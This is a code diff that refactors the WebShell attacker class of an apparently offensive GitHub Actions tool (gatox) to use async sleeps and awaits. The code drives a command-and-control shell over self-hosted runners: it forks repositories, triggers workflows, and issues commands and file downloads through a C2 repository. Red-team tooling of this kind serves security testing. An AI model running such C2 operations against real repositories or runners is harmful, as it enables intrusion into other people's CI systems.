@@ -14,13 +14,12 @@ See the License for the specific language governing permissions and
 limitations under the License.
 """
 
+import asyncio
 import base64
 import random
 import string
-import time
 import re
 import datetime
-import yaml
 
 from gatox.attack.attack import Attacker
 from gatox.cli.output import Output
@@ -186,10 +185,10 @@ class WebShell(Attacker):
             status = await self.api.get_repository(repo_name)
             if status:
                 Output.result(f"Successfully created fork: {repo_name}!")
-                time.sleep(5)
+                await asyncio.sleep(5)
                 break
             else:
-                time.sleep(1)
+                await asyncio.sleep(1)
 
         if not status:
             Output.error(f"Forked repository not found after {self.timeout} seconds!")
@@ -253,7 +252,7 @@ class WebShell(Attacker):
             elif workflow_id > 0:
                 break
             else:
-                time.sleep(1)
+                await asyncio.sleep(1)
         else:
             Output.error(
                 "Failed to find the triggered workflow - actions might be disabled!"
@@ -283,7 +282,7 @@ class WebShell(Attacker):
                 self.interact_webshell(c2_repo, runner_name=runners[0]["name"])
                 break
             else:
-                time.sleep(1)
+                await asyncio.sleep(1)
         else:
             Output.warn("No runners connected to C2 repository!")
             return False
@@ -293,7 +292,7 @@ class WebShell(Attacker):
 
         await self.setup_user_info()
 
-        if not ("repo" in self.user_perms["scopes"]):
+        if "repo" not in self.user_perms["scopes"]:
             Output.error("Insufficient scopes for C2 operator PAT!")
             return False
 
@@ -332,7 +331,7 @@ class WebShell(Attacker):
                     print("Exiting shell...")
                     break
                 elif command == "!list_runners":
-                    self.list_runners(c2_repo)
+                    await self.list_runners(c2_repo)
                 elif command.startswith("!select"):
                     parts = command.split(" ")
                     if len(parts) == 2:
@@ -343,7 +342,7 @@ class WebShell(Attacker):
                     parts = command.split(" ")
                     if len(parts) == 2:
                         file_download = parts[1]
-                    self.issue_command(
+                    await self.issue_command(
                         c2_repo,
                         file_download,
                         timeout=self.timeout,
@@ -358,7 +357,7 @@ class WebShell(Attacker):
                     else:
                         Output.error("Invalid timeout command!")
                 elif command:
-                    self.issue_command(
+                    await self.issue_command(
                         c2_repo, command, timeout=self.timeout, runner_name=runner_name
                     )
                 else:
@@ -504,12 +503,11 @@ class WebShell(Attacker):
         )
 
         if success:
-            time.sleep(5)
+            await asyncio.sleep(5)
             resp = await self.api.call_get(
                 f"/repos/{c2_repo}/commits", params={"per_page": 1}
             )
             if resp.status_code == 200:
-
                 for i in range(timeout):
                     workflow_id = await self.api.get_recent_workflow(
                         c2_repo,
@@ -523,7 +521,7 @@ class WebShell(Attacker):
                     elif workflow_id > 0:
                         break
                     else:
-                        time.sleep(1)
+                        await asyncio.sleep(1)
                 else:
                     Output.error("Failed to find the created workflow!")
                     return
@@ -534,7 +532,7 @@ class WebShell(Attacker):
                         # We just need it to finish.
                         break
                     else:
-                        time.sleep(1)
+                        await asyncio.sleep(1)
                 else:
                     Output.error(
                         "The workflow is incomplete but hit the timeout, "
@@ -583,7 +581,6 @@ class WebShell(Attacker):
         runners = await self.api.get_repo_runners(c2_repo)
 
         if runners:
-
             Output.info(f"There are {len(runners)} runner(s) connected to {c2_repo}:")
             for runner in runners:
                 runner_name = runner["name"]
